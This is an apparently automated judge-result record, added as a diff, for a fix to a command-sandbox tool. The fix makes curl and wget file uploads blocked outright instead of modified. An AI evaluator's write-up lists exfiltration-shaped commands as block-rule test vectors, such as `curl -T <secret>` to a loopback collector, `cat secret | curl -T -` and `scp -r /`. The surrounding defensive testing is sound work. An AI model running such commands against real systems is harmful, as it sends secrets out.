@@ -1,0 +1,117 @@
+{
+  "task_id": "DF-TERMINAL-JAIL-20",
+  "task_title": "Convert egress MODIFY uploads into real containment or document and enforce the security intent",
+  "task_criteria": [
+    "curl file-upload MODIFY verdict must not deliver a local secret to a local collector; add a regression proving the collector receives no secret, preserve legitimate upload controls or document deliberate changes, update docs and YAML parity, full suite and guard green"
+  ],
+  "passed": true,
+  "worktree": "/home/kara/terminal-jail",
+  "branch": "main",
+  "commit": "9f7559064f7ace8b5f8d9567273d6babdd7a27fa",
+  "items": [],
+  "stages": {
+    "tier1": {
+      "id": "tier1",
+      "passed": true,
+      "any_failed": false,
+      "summary": "  \u2713 lint: ok (no output)\n  \u2713 secrets: secrets: harness state excluded from gitleaks scope (.gitreins/**)\n  \u2713 tests: ============================= test session starts ==============================",
+      "steps": [
+        {
+          "id": "lint",
+          "type": "script",
+          "passed": true,
+          "output": "",
+          "error": "",
+          "data": {
+            "exit_code": 0,
+            "guard_log": "/home/kara/terminal-jail/.gitreins/logs/guard-20260919T034952.899135Z.log"
+          }
+        },
+        {
+          "id": "secrets",
+          "type": "script",
+          "passed": true,
+          "output": "secrets: harness state excluded from gitleaks scope (.gitreins/**)\nsecrets: scanners=gitleaks+builtin cross-check\n10:50PM INF scanned ~3844086 bytes (3.84 MB) in 255ms\n10:50PM INF no leaks found\nsecrets: gitleaks: clean\nsecrets: builtin cross-check: Scanned 119 files \u2014 clean (excluded harness state: .gitreins/**)\nsecrets: builtin cross-check status: clean\n",
+          "error": "",
+          "data": {
+            "exit_code": 0,
+            "guard_log": "/home/kara/terminal-jail/.gitreins/logs/guard-20260919T034952.899135Z.log",
+            "secrets_scanners": [
+              "gitleaks",
+              "builtin"
+            ]
+          }
+        },
+        {
+          "id": "tests",
+          "type": "script",
+          "passed": true,
+          "output": "============================= test session starts ==============================\nplatform linux -- Python 3.11.15, pytest-9.1.1, pluggy-1.6.0\nrootdir: /home/kara/terminal-jail\nconfigfile: pyproject.toml\ntestpaths: plugin\ncollected 826 items\n\nplugin/test_backend_selection.py ................                        [  1%]\nplugin/test_board_id_guard.py ........................                   [  4%]\nplugin/test_egress_no_delivery.py ......                                 [  5%]\nplugin/test_escape_waves.py ............................................ [ 10%]\n........................................................................ [ 19%]\n............................................................             [ 26%]\nplugin/test_install.py ............................                      [ 30%]\nplugin/test_interruptor.py ............................................. [ 35%]\n........................................................................ [ 44%]\n........................................................................ [ 53%]\n........................................................................ [ 61%]\n........................................................................ [ 70%]\n....................................................                     [ 76%]\nplugin/test_interruptor_integration.py .............s................... [ 80%]\n...                                                                      [ 81%]\nplugin/test_metrics_export.py .....................                      [ 83%]\nplugin/test_modify_preflight.py ......                                   [ 84%]\nplugin/test_packaging.py ..........                                      [ 85%]\nplugin/test_plugin.py ................                                   [ 87%]\nplugin/test_seccomp.py .........................................sss      [ 92%]\nplugin/test_standalone_cli.py ...................                        [ 95%]\nplugin/test_systemd_directive_probe.py ...........                       [ 96%]\nplugin/test_userns.py .........................s..                       [100%]\n\n======================= 821 passed, 5 skipped in 20.34s ========================\n",
+          "error": "",
+          "data": {
+            "exit_code": 0,
+            "pytest_outcome": {
+              "kind": "passed",
+              "detail": "pytest passed",
+              "first_failing_test": null,
+              "failures": 0,
+              "interrupted": false
+            },
+            "guard_log": "/home/kara/terminal-jail/.gitreins/logs/guard-20260919T034952.899135Z.log"
+          }
+        }
+      ],
+      "coverage": "secrets+lint+tests"
+    },
+    "tier2": {
+      "id": "tier2",
+      "passed": true,
+      "any_failed": false,
+      "summary": "COMPLETE\n  \u2713 curl file-upload MODIFY verdict must not deliver a local secret to a local collector; add a regression proving the collector receives no secret, preserve legitimate upload controls or document deliberate changes, update docs and YAML parity, full suite and guard green: DEFECT FIXED (independent repro, /tmp/df20_probe.py): real standalone CLI vs loopback http.server collector with shipped mirror pinned \u2014 `terminal-jail curl -s -T <secret> http://127.0.0.1:<port>/collect` -> rc=126, stderr 'COMMAND BLOCKED \u2014 builtin-net-curl-upload', collector requests=[], SECRET DELIVERED: False (pre-fix this was MODIFY/builtin-net-curl-upload with the payload received). REGRESSION: plugin/test_egress_no_delivery.py (new, 279 lines) has 3 no-delivery tests (curl -T, curl --data-binary @file, wget --post-file) asserting rc==126 + rule id + collector.requests==[] + marker absent from bodies, plus 2 positive controls (plain download, inline-body POST) that must still deliver so 'nothing received' cannot pass vacuously; `.venv/bin/python -m pytest -q -p no:cacheprovider plugin/test_egress_no_delivery.py` -> 6 passed in 3.69s. RED PROOF reproduced: reverting blocklist.py/sandbox.py/00-builtins.yaml to pre-fix c454ccf makes the same file report '4 failed, 2 passed' with `AssertionError: engine verdict for the collector vector is 'modify' (rule='auto-pytest')`; files restored byte-identical to HEAD (git diff HEAD empty). CONTROLS PRESERVED: /tmp/df20_controls.py \u2014 13 pinned ALLOW controls (plain curl download, wget -O, inline -d/--data-binary, inline -F field, --form-string, wget --post-data, scoped rsync/scp, local copy, git push, ssh, curl -fsSL) all action=allow; 15 upload/exfil shapes (clustered -sT, attached -T/path, --upload-file=, -sF, quoted-& URL, rsync -a / host:, scp -r /, `cat secret | curl -T -`) all action=block; failures: 0. YAML PARITY: 4 ids moved to blocklist.py as priority-1000 block rules and removed from sandbox.py (13->9); plugin/terminal_jail/rules/00-builtins.yaml:398/414/425/442 carry the same ids at action: block with byte-identical patterns; `scripts/yaml-mirror-parity-probe.py` -> 'ALL PROBES PASS', '[totals] block=35/35 sandbox=9/9 allow=10/10 total=54/54 -> OK', exit 0. DOCS: README \u00a71c 'Data-Out Boundary' (block table, pinned controls, upgrade note), specs/interruptor.md \u00a74.5/\u00a74.6, CHANGELOG.md, docs/quickstart.md (54 rules), skills/terminal-jail-usage/SKILL.md 1.7.0, docs/dogfood/diagnostics.md DF-20 row RESOLVED. FULL SUITE: `.venv/bin/python -m pytest -q -p no:cacheprovider` -> 821 passed, 5 skipped in 20.19s. GUARD: `gitreins guard --full` -> 'Tier 1 Guards: PASS (test mode: full, whole tree) \u2014 secrets clean, lint ok, tests (full), static_analysis'. LSP diagnostics: 0.\nThe egress MODIFY uploads were converted to real BLOCK containment (verified end-to-end: rc=126, collector receives zero requests, no secret delivered), with a regression that fails on the pre-fix engine, all legitimate upload controls preserved, docs/YAML parity updated, and the full suite (821 passed) plus guard (4/4 PASS) green.",
+      "steps": [
+        {
+          "id": "tier2",
+          "type": "ai_eval",
+          "passed": true,
+          "output": "COMPLETE\n  \u2713 curl file-upload MODIFY verdict must not deliver a local secret to a local collector; add a regression proving the collector receives no secret, preserve legitimate upload controls or document deliberate changes, update docs and YAML parity, full suite and guard green: DEFECT FIXED (independent repro, /tmp/df20_probe.py): real standalone CLI vs loopback http.server collector with shipped mirror pinned \u2014 `terminal-jail curl -s -T <secret> http://127.0.0.1:<port>/collect` -> rc=126, stderr 'COMMAND BLOCKED \u2014 builtin-net-curl-upload', collector requests=[], SECRET DELIVERED: False (pre-fix this was MODIFY/builtin-net-curl-upload with the payload received). REGRESSION: plugin/test_egress_no_delivery.py (new, 279 lines) has 3 no-delivery tests (curl -T, curl --data-binary @file, wget --post-file) asserting rc==126 + rule id + collector.requests==[] + marker absent from bodies, plus 2 positive controls (plain download, inline-body POST) that must still deliver so 'nothing received' cannot pass vacuously; `.venv/bin/python -m pytest -q -p no:cacheprovider plugin/test_egress_no_delivery.py` -> 6 passed in 3.69s. RED PROOF reproduced: reverting blocklist.py/sandbox.py/00-builtins.yaml to pre-fix c454ccf makes the same file report '4 failed, 2 passed' with `AssertionError: engine verdict for the collector vector is 'modify' (rule='auto-pytest')`; files restored byte-identical to HEAD (git diff HEAD empty). CONTROLS PRESERVED: /tmp/df20_controls.py \u2014 13 pinned ALLOW controls (plain curl download, wget -O, inline -d/--data-binary, inline -F field, --form-string, wget --post-data, scoped rsync/scp, local copy, git push, ssh, curl -fsSL) all action=allow; 15 upload/exfil shapes (clustered -sT, attached -T/path, --upload-file=, -sF, quoted-& URL, rsync -a / host:, scp -r /, `cat secret | curl -T -`) all action=block; failures: 0. YAML PARITY: 4 ids moved to blocklist.py as priority-1000 block rules and removed from sandbox.py (13->9); plugin/terminal_jail/rules/00-builtins.yaml:398/414/425/442 carry the same ids at action: block with byte-identical patterns; `scripts/yaml-mirror-parity-probe.py` -> 'ALL PROBES PASS', '[totals] block=35/35 sandbox=9/9 allow=10/10 total=54/54 -> OK', exit 0. DOCS: README \u00a71c 'Data-Out Boundary' (block table, pinned controls, upgrade note), specs/interruptor.md \u00a74.5/\u00a74.6, CHANGELOG.md, docs/quickstart.md (54 rules), skills/terminal-jail-usage/SKILL.md 1.7.0, docs/dogfood/diagnostics.md DF-20 row RESOLVED. FULL SUITE: `.venv/bin/python -m pytest -q -p no:cacheprovider` -> 821 passed, 5 skipped in 20.19s. GUARD: `gitreins guard --full` -> 'Tier 1 Guards: PASS (test mode: full, whole tree) \u2014 secrets clean, lint ok, tests (full), static_analysis'. LSP diagnostics: 0.\nThe egress MODIFY uploads were converted to real BLOCK containment (verified end-to-end: rc=126, collector receives zero requests, no secret delivered), with a regression that fails on the pre-fix engine, all legitimate upload controls preserved, docs/YAML parity updated, and the full suite (821 passed) plus guard (4/4 PASS) green.",
+          "error": "",
+          "data": {
+            "verdict": "COMPLETE",
+            "items": [
+              {
+                "criterion": "curl file-upload MODIFY verdict must not deliver a local secret to a local collector; add a regression proving the collector receives no secret, preserve legitimate upload controls or document deliberate changes, update docs and YAML parity, full suite and guard green",
+                "status": "PASS",
+                "detail": "DEFECT FIXED (independent repro, /tmp/df20_probe.py): real standalone CLI vs loopback http.server collector with shipped mirror pinned \u2014 `terminal-jail curl -s -T <secret> http://127.0.0.1:<port>/collect` -> rc=126, stderr 'COMMAND BLOCKED \u2014 builtin-net-curl-upload', collector requests=[], SECRET DELIVERED: False (pre-fix this was MODIFY/builtin-net-curl-upload with the payload received). REGRESSION: plugin/test_egress_no_delivery.py (new, 279 lines) has 3 no-delivery tests (curl -T, curl --data-binary @file, wget --post-file) asserting rc==126 + rule id + collector.requests==[] + marker absent from bodies, plus 2 positive controls (plain download, inline-body POST) that must still deliver so 'nothing received' cannot pass vacuously; `.venv/bin/python -m pytest -q -p no:cacheprovider plugin/test_egress_no_delivery.py` -> 6 passed in 3.69s. RED PROOF reproduced: reverting blocklist.py/sandbox.py/00-builtins.yaml to pre-fix c454ccf makes the same file report '4 failed, 2 passed' with `AssertionError: engine verdict for the collector vector is 'modify' (rule='auto-pytest')`; files restored byte-identical to HEAD (git diff HEAD empty). CONTROLS PRESERVED: /tmp/df20_controls.py \u2014 13 pinned ALLOW controls (plain curl download, wget -O, inline -d/--data-binary, inline -F field, --form-string, wget --post-data, scoped rsync/scp, local copy, git push, ssh, curl -fsSL) all action=allow; 15 upload/exfil shapes (clustered -sT, attached -T/path, --upload-file=, -sF, quoted-& URL, rsync -a / host:, scp -r /, `cat secret | curl -T -`) all action=block; failures: 0. YAML PARITY: 4 ids moved to blocklist.py as priority-1000 block rules and removed from sandbox.py (13->9); plugin/terminal_jail/rules/00-builtins.yaml:398/414/425/442 carry the same ids at action: block with byte-identical patterns; `scripts/yaml-mirror-parity-probe.py` -> 'ALL PROBES PASS', '[totals] block=35/35 sandbox=9/9 allow=10/10 total=54/54 -> OK', exit 0. DOCS: README \u00a71c 'Data-Out Boundary' (block table, pinned controls, upgrade note), specs/interruptor.md \u00a74.5/\u00a74.6, CHANGELOG.md, docs/quickstart.md (54 rules), skills/terminal-jail-usage/SKILL.md 1.7.0, docs/dogfood/diagnostics.md DF-20 row RESOLVED. FULL SUITE: `.venv/bin/python -m pytest -q -p no:cacheprovider` -> 821 passed, 5 skipped in 20.19s. GUARD: `gitreins guard --full` -> 'Tier 1 Guards: PASS (test mode: full, whole tree) \u2014 secrets clean, lint ok, tests (full), static_analysis'. LSP diagnostics: 0."
+              }
+            ],
+            "summary": "The egress MODIFY uploads were converted to real BLOCK containment (verified end-to-end: rc=126, collector receives zero requests, no secret delivered), with a regression that fails on the pre-fix engine, all legitimate upload controls preserved, docs/YAML parity updated, and the full suite (821 passed) plus guard (4/4 PASS) green."
+          }
+        }
+      ]
+    }
+  },
+  "summary": "Judge Result: DF-TERMINAL-JAIL-20\n\nStage tier1: PASS\n    \u2713 lint: ok (no output)\n  \u2713 secrets: secrets: harness state excluded from gitleaks scope (.gitreins/**)\n  \u2713 tests: ============================= test session starts ==============================\n\nStage tier2: PASS\n  COMPLETE\n  \u2713 curl file-upload MODIFY verdict must not deliver a local secret to a local collector; add a regression proving the collector receives no secret, preserve legitimate upload controls or document deliberate changes, update docs and YAML parity, full suite and guard green: DEFECT FIXED (independent repro, /tmp/df20_probe.py): real standalone CLI vs loopback http.server collector with shipped mirror pinned \u2014 `terminal-jail curl -s -T <secret> http://127.0.0.1:<port>/collect` -> rc=126, stderr 'COMMAND BLOCKED \u2014 builtin-net-curl-upload', collector requests=[], SECRET DELIVERED: False (pre-fix this was MODIFY/builtin-net-curl-upload with the payload received). REGRESSION: plugin/test_egress_no_delivery.py (new, 279 lines) has 3 no-delivery tests (curl -T, curl --data-binary @file, wget --post-file) asserting rc==126 + rule id + collector.requests==[] + marker absent from bodies, plus 2 positive controls (plain download, inline-body POST) that must still deliver so 'nothing received' cannot pass vacuously; `.venv/bin/python -m pytest -q -p no:cacheprovider plugin/test_egress_no_delivery.py` -> 6 passed in 3.69s. RED PROOF reproduced: reverting blocklist.py/sandbox.py/00-builtins.yaml to pre-fix c454ccf makes the same file report '4 failed, 2 passed' with `AssertionError: engine verdict for the collector vector is 'modify' (rule='auto-pytest')`; files restored byte-identical to HEAD (git diff HEAD empty). CONTROLS PRESERVED: /tmp/df20_controls.py \u2014 13 pinned ALLOW controls (plain curl download, wget -O, inline -d/--data-binary, inline -F field, --form-string, wget --post-data, scoped rsync/scp, local copy, git push, ssh, curl -fsSL) all action=allow; 15 upload/exfil shapes (clustered -sT, attached -T/path, --upload-file=, -sF, quoted-& URL, rsync -a / host:, scp -r /, `cat secret | curl -T -`) all action=block; failures: 0. YAML PARITY: 4 ids moved to blocklist.py as priority-1000 block rules and removed from sandbox.py (13->9); plugin/terminal_jail/rules/00-builtins.yaml:398/414/425/442 carry the same ids at action: block with byte-identical patterns; `scripts/yaml-mirror-parity-probe.py` -> 'ALL PROBES PASS', '[totals] block=35/35 sandbox=9/9 allow=10/10 total=54/54 -> OK', exit 0. DOCS: README \u00a71c 'Data-Out Boundary' (block table, pinned controls, upgrade note), specs/interruptor.md \u00a74.5/\u00a74.6, CHANGELOG.md, docs/quickstart.md (54 rules), skills/terminal-jail-usage/SKILL.md 1.7.0, docs/dogfood/diagnostics.md DF-20 row RESOLVED. FULL SUITE: `.venv/bin/python -m pytest -q -p no:cacheprovider` -> 821 passed, 5 skipped in 20.19s. GUARD: `gitreins guard --full` -> 'Tier 1 Guards: PASS (test mode: full, whole tree) \u2014 secrets clean, lint ok, tests (full), static_analysis'. LSP diagnostics: 0.\nThe egress MODIFY uploads were converted to real BLOCK containment (verified end-to-end: rc=126, collector receives zero requests, no secret delivered), with a regression that fails on the pre-fix engine, all legitimate upload controls preserved, docs/YAML parity updated, and the full suite (821 passed) plus guard (4/4 PASS) green.\n\nOverall: PASS \u2713",
+  "evaluated_at": "2026-09-19T03:52:21.852154",
+  "evidence": {
+    "collected_at": "2026-09-19T03:52:21.873826+00:00",
+    "items": [
+      {
+        "name": "patch",
+        "label": "Landed commit patch",
+        "file": "commit.patch",
+        "bytes": 29183,
+        "truncated": false,
+        "source": "git show 9f7559064f7a"
+      },
+      {
+        "name": "worktree",
+        "label": "Working-tree diff (graded)",
+        "file": "worktree.patch",
+        "bytes": 1500,
+        "truncated": false,
+        "source": "git diff HEAD (working tree)"
+      }
+    ],
+    "task_id": "DF-TERMINAL-JAIL-20"
+  }
+}
